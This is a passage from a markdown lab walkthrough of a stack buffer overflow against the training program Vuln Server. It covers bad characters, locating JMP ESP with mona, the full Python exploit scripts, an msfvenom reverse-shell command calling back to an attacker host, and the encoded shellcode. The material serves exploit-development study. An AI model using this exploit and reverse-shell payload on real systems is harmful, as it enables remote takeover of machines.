"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2003 + "B" * 4 + badchars

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.100', 9999))
                
                s.send(('TRUN /.:/' + shellcode))
                s.close()
        
        except:
                print "Error connecting to server"
                sys.exit()
```

- Again, save it as `4.py` and `chmod +x`:

    - ![image](https://user-images.githubusercontent.com/94720207/169371638-106e87df-3314-4524-889e-bc43acb8b475.png)

- So, just to get completly what will happen is very very easy with the next image

    - Those are ALL the HEX characters available to some programs (like Vuln Server) to do "something", so, maybe some of those commands we saw on the list at the beginnig run at some HEX code inside all those characters.
    
    - For example:
    
        - Maybe the character `x70` is being used by a command.
        
        - That means, if any command is using that HEX code `x70`, that's a `bad character`, because is already taken by another command. If we use it, the program will break. 
        
        - ![image](https://user-images.githubusercontent.com/94720207/169372966-0bc4a042-ba70-4e8c-9e04-26563b9a721f.png)
 
- So, now that we know how the characters work, let's run the script! que chille! 
 
    - ![image](https://user-images.githubusercontent.com/94720207/169374216-fa9ee16b-cba3-46eb-bbf4-47a1633494fc.png)
    
- The program crashed again, so let's take a look to the `Immunity Debugger`:

    - ![image](https://user-images.githubusercontent.com/94720207/169375704-1d43d637-6a2c-480c-a3fa-60c7cffe8d14.png)
    
    - We can see again the `42424242` on the `EIP`
    
    - But now, what we really want to know is the `HEX dump`:
    
        - To look at the Hex dump, just `right+click` on the value > `follow the Dump`-
        
        - ![image](https://user-images.githubusercontent.com/94720207/169376138-73ea3f95-2b92-4050-9d08-72cc92246a1c.png)
    
    - Now, let's take a look at the dump (bottom left corner):
    
        - ![image](https://user-images.githubusercontent.com/94720207/169404087-16cb598f-7fed-435e-846f-07977252a354.png)
    
    - **It's easy to read it, it's just a sequence number going: 1,2,3,4,5,6,7,8,9,10<---- but in HEX...**
    
        - This means:
    
            - We are looking for a bad char in between all that sequence, if any number is missing on the sequence, then, it means that char is being used and it's a `bad char`, just like that...
        
            - **In this Lab of Vuln Server, there are NOT bad chars!!! That's why we cannot see any "weird" sequence like: 1,2,3,5,6...**
        
            - In technic words, we are specting all that characters to happen.
            
            - The last thing we sent was `FF`, so if we search for `FF` at the end of the list, that means that we need to search only from the beginning to `FF`.

- **Just as an example** of a `bad char` let's see this Dump from **another Lab** 

    - ![image](https://user-images.githubusercontent.com/94720207/169384923-46ad25d7-56bb-4323-ba5d-05576cdae939.png)

        - Right away in the first line we saw a "weird" sequence: **1,2,3... `B0`, `B0` ...6, 7, 8**
        
        - This means `B0` is a `bad char`, we need to note all `B0`s including the missing numbers that this miss-sequence originates.
    
    - **Write down all this numbers, because we need them to generate the final shellcode to gain root!!!**
    
        - NOTE: Remember, in this lab there are NOT `bad chars` this was just an example! 

---

### Finding the right module

- Finding the right module means that we are looking for a `.dll` or something similar inside our program (Vuln Server) that has no memory protections.  

- No memory protections means: `no depth`, `no ASLR`, `no safe SEH`, etc.

    - **There's a tool called `Mona Modules` that makes the life much easier for that... ;)**
    
        - `**Mona` is used within `Immunity Debugger` to achieve this. [Direct Link to Mona Modules](https://github.com/corelan/mona)**
        
        - You only need to **[download the mona.py file](https://raw.githubusercontent.com/corelan/mona/master/mona.py)**
        
        - Then, put it on the same folder as **Immunity Debugger PyCommands**:
        
            - `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands`
            
            - ![image](https://user-images.githubusercontent.com/94720207/169390146-a78e60dc-5218-4877-8f35-6b39c243313b.png)
                    
        - That's all!!! We got `Mona` ready to use.

- Once everything is ready, we can start `vuln server` and `Immunity Debugger`, attach the program, etc.

    - **To use `Mona Modules`, the only extra thing to do now is typingon the bottom bar before `play` it:
    
        - `!mona modules` (and hit >Enter<) 

        - ![image](https://user-images.githubusercontent.com/94720207/169392574-6d6d7ca4-04c8-4749-a1a0-b726ee7fc08d.png)

- _NOTE: If the windows if Immunityu Debugger goes crazy, just close all windows, select: view > cpu, maximize it, and move the tiles again ;)_

    - After pressing enter using the command `!mona modules` this window pop-up _(click to enlarge)_:
    
    - ![image](https://user-images.githubusercontent.com/94720207/169396750-98021efd-9586-4236-9926-e9fbef89540c.png)

        - First of all, that rows marked with `blue` are the `Protection Settings`
        
        - Some are `False` and others are `True`...
        
        - We are looking for `False`, because that means that "something" does not have any protection, for example, `essfunc.dll` down not have any protection = `False,False,False,False`
        
            - This means: **We are looking for something attached to Vuln Server (like a .dll) that doesn't have any protection, for example `essfunc.dll`, let's take a note of this and now do this other process:**    

- **Finding the opcode equivalent of a jump**

    - In Kali Linux:
    
        - We're going to locate something called `NASM shell`:
        
        - ![image](https://user-images.githubusercontent.com/94720207/169400501-202dd0b7-58fa-47ad-b3a2-1f120b7d8b02.png)
        
    - Ok, let's do this!
    
        - We're looking for the `opcode equivalent`
        
        - We are trying to convert `assambly language` into `HEX code` so we need to do:
        
            1. Run the `nasm_shell` script (directly from the original path, otherwise it doesn't work):
            
                - `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` 
            
                - ![image](https://user-images.githubusercontent.com/94720207/169401488-3dd91bcb-c2ea-4fcf-be75-7abdb76bc0c9.png)
                
            2. Type in `assembly language` `JMP ESP` which means: "Jump(command) to ESP(pointer)" 
            
                - ![image](https://user-images.githubusercontent.com/94720207/169410984-674a4a45-bcbf-49eb-ac3c-5e88371da587.png)

            3. Now we know that the `JMP ESP` equivalent in `HEX` is = `FFE4`!!!
            
                - So, now I will keep that HEX `FFE4` and take it to the `Immunity Debugger`

- Once in the `Immunity Debugger` we will type:

    -  `!mona find -s "\xff\xe4" -m essfunc.dll`

        - `-s` is used to find
        - `-m` is used for "module" 
        
    - ![image](https://user-images.githubusercontent.com/94720207/169409906-6d42fc15-289f-40d8-a002-f345a843fa86.png)
    
        - We are searching here a `return address`
        
        - For example, the first row means the `retrun addresses`, so, if we start from the top we found:
        
            - **Return Address = `625011AF`** for `ssfunc.dll`

- **In Kali Machine**

    - Again, We only need to copy that code and modify the `l.py` or `2.py` or `3.py` or `4.py` that we made on past tasks.
    
    - We can make another file called `5.py` with the modification.
    
        - **We will delete from `shellcode = "A" * 2003 + "B" * 4 + badchars`; the ending: `"B" * 4 + badchars`:
        
            - Result: **`shellcode = "A" * 2003 +`**
            
        - **Now, remember the `BBBB`?... -it's the same script we used back then! ;)**   
        
        - **Now instead of using inocent `BBBB` we going to put out pointer "Return Address" =  `625011AF`
        
            - But we going to put it in a special mode! in **"reverse"** : **"2 by 2"**! 
            
                - Original = `625011AF`
                - Spaced   = `62 50 11 AF`
                - **Reversed** = **`AF 11 50 62`**
            
        - This **"Special Reverse"** actually is called technically `little endian format` whicH is used when we "talk" with `x86 Architecture`
        
        - This means, `x86 Architecture` actually stores the **low order byte at the lowest address** and the **high order byte at the highest address**. So we need to put it in reverse order...
        
            - What this should do now is this should throw the same "air" before, but it's going to hit a `jump point`.
            
            - We can do something special in `Immunity Debugger` to actually catch this.
            
                - So, we will save our new script:
                
```python
#!/usr/bin/python
import sys, socket
from time import sleep

        # Remember x86 Architecture:

    # Original = `625011AF`
    # Spaced   = `62 50 11 AF`
    # Reversed = `AF 11 50 62`
    # Final    = "\xAF\x11\x50\x62"

shellcode = "A" * 2003 + "\xAF\x11\x50\x62"

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.100', 9999))
                
                s.send(('TRUN /.:/' + shellcode))
                s.close()
        
        except:
                print "Error connecting to server"
                sys.exit()
```

- Again, save it as `5.py` and `chmod +x`:

    - ![image](https://user-images.githubusercontent.com/94720207/169371638-106e87df-3314-4524-889e-bc43acb8b475.png)
    
    - And now let's open `Immunity Debugger` and make something special ;) 
    
    - First of all, in the top left corner we need to click `go to address in disassembler` (the blue arrow) 
    
        - ![image](https://user-images.githubusercontent.com/94720207/169414780-ae96ab60-33be-4d28-81b4-2039a41d61b5.png)
    
    - Then we will add the value of `625011AF` (Remember the original `pointer address` AKA our `jump code`?)
    
        - ![image](https://user-images.githubusercontent.com/94720207/169415237-8c38ae0b-e4fe-4392-bf73-eda13eb5f309.png)

    - We press enter or "ok", and it will find automatically `FFE4` !!! Remember???:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169416506-99db9054-de4e-4739-a098-c5fe7e589341.png) 
    
        - _"3. Now we know that the `JMP ESP` equivalent in `HEX` is = `FFE4`!!!"_
           
           - This means, it took us to our `jump code` = `JMP ESP` and that's exactly what we want!
           
           - Now, we goinf to hit `F2` in the keyboard, and it will turn the value aqua-blue.
           
           - ![image](https://user-images.githubusercontent.com/94720207/169417320-19cd709e-66ee-4c0b-b820-3474317b1212.png)
           
           - **What we have just done is we've set a breakpoint:**
           
               - We have the `breakpoint` running, what this means is we're gonna overflow the buffer but if we hit this "specific spot" or `jump code` it's not going to jump to a further instruction.
               
               - **It's actually going to break the program (Vuln Server) and pause right here for further instruction from us**
               
               - So for now, we just want to know that we are hitting this > overriding the `EIP` > Located in the specific spot `breakpoint` > And we're gonna be able to jump forward.
               
    - **Press "Play" in the `Immunity Debugger`:
          
        - ![image](https://user-images.githubusercontent.com/94720207/169417411-8fc85d31-919b-44c0-ba7e-37b19edf49d7.png)
       
    - **And then execute the script in Kali:**

        - ![image](https://user-images.githubusercontent.com/94720207/169416805-ed3e64f1-7286-4e04-a5b4-71c69aed4a4b.png)
    
    - It crashes instantly again, and it shows the message **`Breakpoint at essfunc.625011AF`**
    
        - ![image](https://user-images.githubusercontent.com/94720207/169417565-18094b0e-83b8-4158-a5d7-db0fc2dd4f2f.png)

    - And the program (Vuln Server) is now paused:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169418035-8263d336-6e30-47e8-8090-7423ba6ed2e4.png)

    - **We have hit our `breakpoint` that means we `control this EIP`!!!** :D
    
        - ![image](https://user-images.githubusercontent.com/94720207/169418355-82a7ff51-b8d5-4cb7-8210-b7875b13dde1.png)
    
    - **We control the `EIP`! and now the only thing to do is generate a `shellcode` to gain a `root shell`**

--- 

### Generating and Gaining Shells

- We going to use `msfvenom` by `metasploit` to generate a payload

- Just like all the payloads generated in `msfvenom`, but I will mention this specific flags:

    - `-p windows/shell_reverse_tcp` = type of shell/payload
    - `LHOST` & `LPORT` = LOCAL>Attacker (Kali)
    - ![image](https://user-images.githubusercontent.com/94720207/169419352-75669845-c6a1-458f-be9a-25a409d2241c.png)
    - `EXITFUNC=thread` =  More stable shell
    - `-f c` = File type C (C language)
    - `-a x86` = Architecture x86
    
    - **`-b "\x00"` bad characters!!!** 

        - Remeber, Vuln Server does not have `badchars` so, in this case, we only will use x00 Null Byte as a badchar.
        - Otherwise, add the other `badchar` here!
    
    - **Command:**
    
    - **`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.66 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`**
    
    - ![image](https://user-images.githubusercontent.com/94720207/169429642-6103e5bd-18e1-47c2-bebe-0a5f333a471a.png)

    - **BOOM!!! We just have generated `THE SHELLCODE` (++++ [in nomine dei nostri excelsi](https://youtu.be/j3_ew_pvPXE?t=292) ++++)
    
        - **We only need to paste it to our last python script and the world is us**  

- **In Kali Machine**

    - Again, We only need to copy that code and modify the `l.py` or `2.py` or `3.py` or `4.py` or `5.py` that we made on past tasks.
    
    - **We can make another file called `666_THE_SHELLCODE.py` with the last modification.**
    
        - We will copy the whole shellcode **inside `()` WITHOUT THE `;` in a new variable called `overflow`**
        
        - NOTE: In this case we will not care about the payload size, but maybe there are scenarios with a very limited space (in this case was 4 bytes = "AAAA", so it's something to take care for the future Labs!)
        
            - ![image](https://user-images.githubusercontent.com/94720207/169429805-c6cbd27d-3daa-4401-975d-98efef9f8a76.png)
        
        - We also will add `+ overflow` at the line: `shellcode = "A" * 2003 + "\xAF\x11\x50\x62"` to get:
        
            - `shellcode = "A" * 2003 + "\xAF\x11\x50\x62" + overflow` 

```python
#!/usr/bin/python
import sys, socket
from time import sleep

overflow = ("\xda\xd5\xbd\xa2\xbc\x38\x27\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x31\x6e\x17\x83\xc6\x04\x03\xcc\xaf\xda\xd2\xec\x38\x98"
"\x1d\x0c\xb9\xfd\x94\xe9\x88\x3d\xc2\x7a\xba\x8d\x80\x2e\x37"
"\x65\xc4\xda\xcc\x0b\xc1\xed\x65\xa1\x37\xc0\x76\x9a\x04\x43"
"\xf5\xe1\x58\xa3\xc4\x29\xad\xa2\x01\x57\x5c\xf6\xda\x13\xf3"
"\xe6\x6f\x69\xc8\x8d\x3c\x7f\x48\x72\xf4\x7e\x79\x25\x8e\xd8"
"\x59\xc4\x43\x51\xd0\xde\x80\x5c\xaa\x55\x72\x2a\x2d\xbf\x4a"
"\xd3\x82\xfe\x62\x26\xda\xc7\x45\xd9\xa9\x31\xb6\x64\xaa\x86"
"\xc4\xb2\x3f\x1c\x6e\x30\xe7\xf8\x8e\x95\x7e\x8b\x9d\x52\xf4"
"\xd3\x81\x65\xd9\x68\xbd\xee\xdc\xbe\x37\xb4\xfa\x1a\x13\x6e"
"\x62\x3b\xf9\xc1\x9b\x5b\xa2\xbe\x39\x10\x4f\xaa\x33\x7b\x18"
"\x1f\x7e\x83\xd8\x37\x09\xf0\xea\x98\xa1\x9e\x46\x50\x6c\x59"
"\xa8\x4b\xc8\xf5\x57\x74\x29\xdc\x93\x20\x79\x76\x35\x49\x12"
"\x86\xba\x9c\xb5\xd6\x14\x4f\x76\x86\xd4\x3f\x1e\xcc\xda\x60"
"\x3e\xef\x30\x09\xd5\x0a\xd3\xf6\x82\x15\x61\x9f\xd0\x15\x74"
"\x03\x5c\xf3\x1c\xab\x08\xac\x88\x52\x11\x26\x28\x9a\x8f\x43"
"\x6a\x10\x3c\xb4\x25\xd1\x49\xa6\xd2\x11\x04\x94\x75\x2d\xb2"
"\xb0\x1a\xbc\x59\x40\x54\xdd\xf5\x17\x31\x13\x0c\xfd\xaf\x0a"
"\xa6\xe3\x2d\xca\x81\xa7\xe9\x2f\x0f\x26\x7f\x0b\x2b\x38\xb9"
"\x94\x77\x6c\x15\xc3\x21\xda\xd3\xbd\x83\xb4\x8d\x12\x4a\x50"
"\x4b\x59\x4d\x26\x54\xb4\x3b\xc6\xe5\x61\x7a\xf9\xca\xe5\x8a"
"\x82\x36\x96\x75\x59\xf3\xb6\x97\x4b\x0e\x5f\x0e\x1e\xb3\x02"
"\xb1\xf5\xf0\x3a\x32\xff\x88\xb8\x2a\x8a\x8d\x85\xec\x67\xfc"
"\x96\x98\x87\x53\x96\x88")

    # What will happen?
    
        # 1. A = 2003   |--->>> The specific bytes to crash the program and get to the EIP = 2003 bytes, OK!
        
        # 2. + "\xAF\x11\x50\x62"   |--->>>  The Pointer Address or JMP Address (We will jump here)
        
        # 3. + overflow   |--->>>  The set of instruction we are providing just at the Pointer after the crash

            # RESULT >>> shellcode = "A" * 2003 + "\xAF\x11\x50\x62" + overflow
        
        # 4. But! before submit the `overflow` we need to add something else called `knobs` 
        
            # Knobs looks something like this: 
            
                # shellcode = "A" * 2003 + "\xAF\x11\x50\x62" + "\x90" * 32 + overflow
            
            # Knobs ("\x90" * 32) are padding essentially they stand for no operation, used just for add some "space" between this jump command in this overflow shellcode.
            
            # Without knobs, the overflow may not work adn maybe we can't get command execution on the other computer because something interfered here. 
            # So, we just add a little bit of padding in between these two and that make it a little bit more safe.
            
        # NOTE: If you have limited space for the payload is very important to add padding maybe 8 bytes, or 16... you need to experiment with different values and figure out. 

shellcode = "A" * 2003 + "\xAF\x11\x50\x62" + "\x90" * 32 + overflow 

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.100', 9999))
                
                s.send(('TRUN /.:/' + shellcode))
                s.close()
        
        except:
                print "Error connecting to server"
                sys.exit()
```

- Again, save it as `666_THE_SHELLCODE.py` and `chmod +x`:

    - ![image](https://user-images.githubusercontent.com/94720207/169425688-fbcf47d9-760c-4272-8673-93685ddbc841.png)
    
- Now on the Kali Machine:

    - I'm gonna setup a `netcat` listener using the port `4444`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169425779-3d872e37-fb32-4ac7-8353-50ebc8955800.png)

- Finally:

    - **Run `Vuln Server` as Admin** (we don't need immunity debugger this time, we are simulating the "final attack" to "the real server")
    
    - ![image](https://user-images.githubusercontent.com/94720207/169426242-85dc6929-f3c9-429c-99d6-276e28c20c77.png)
     
    - **And now...run the `666_THE_SHELLCODE.py` muuaaahhahaha!** 
    
        - NOTE: If you not get the reverse shell maybe is maybe because one of the following: 
        
        - **First of all, check the `msfvenom` payload again!!! Maybe a finger error!**
        
        - **The firewall of Windows is enabled, disable it!:**
        
        - Before running the the VMware or Virtual Machine with Kali, firewall of the "Host OS" must be turned off, so restart Kali!. 
        
        - ![image](https://user-images.githubusercontent.com/94720207/169427179-75dc9b44-bb28-4401-8233-cb32bc8722f5.png)

        - NOTE: If still not working, do this trick! ;):

            - Open up the Windows Firewall from within the Control Panel or search for it.
                - ![image](https://user-images.githubusercontent.com/94720207/169427496-233d0d3a-d7d4-4258-8beb-76dbcab54fb9.png)
                
            - Click Advanced Settings on the left.
                - ![image](https://user-images.githubusercontent.com/94720207/169427551-3c7f16e2-db78-4cb0-8fce-0ea3ae27adce.png)
 
            - From the left pane of the resulting window, click Inbound Rules.
                - ![image](https://user-images.githubusercontent.com/94720207/169427651-25c71a57-827b-4fc0-85e5-711195dd06b8.png)
            
            - In the right pane, find the rules titled File and Printer Sharing (Echo Request - ICMPv4-In).
      
            - Right-click each rule and choose Enable Rule.
                - ![image](https://user-images.githubusercontent.com/94720207/169427888-e9639ebe-b056-4481-a4bc-187550f86154.png)
            
            - Also try to ping both devices `Windows 10` and Virtual Machine `Kali`, if the super fz3r0 troubleshooting (found in my index page) does not work, or try to change the settigns of the network on VMWare (I'm using bridged)
            
            - ![image](https://user-images.githubusercontent.com/94720207/169428950-d1b5f22b-4088-44fd-93bf-0e5f65450a63.png)
            - ![image](https://user-images.githubusercontent.com/94720207/169429001-500270d7-8f6b-4446-9d5b-dbfd97628fb4.png)
      
    - **And now...run the `666_THE_SHELLCODE.py` muuaaahhahaha!x2**
    
    - **PoC:** 
    
        - ![image](https://user-images.githubusercontent.com/94720207/169430510-e116e0d0-5826-4a43-9527-05c0cfd0d0bb.png)
        
        - At same time, `Vuln Server` continue running, without crashing, sending and recivieng connection...using our malicious `shellcode`.
        
             - **That's it!!! Buffer Overflow is done!! :D**
             
                 - Bonus Hacker stuff:
                 
                 - ![image](https://user-images.githubusercontent.com/94720207/169431693-03ecff42-393a-475e-a004-fdc2ef6a8923.png)

                 - ![image](https://user-images.githubusercontent.com/94720207/169431940-3a88e4a4-b22c-41e9-9a10-1c6089ecab4e.png)

---

### References

- https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G
- https://www.asciihex.com/character/control/0/0x00/nul-null-character
- https://cryptii.com/pipes/hex-decoder
- https://github.com/corelan/mona 
- https://reverseengineering.stackexchange.com/questions/13161/immunity-debugger-reset-windows-to-default-tiling
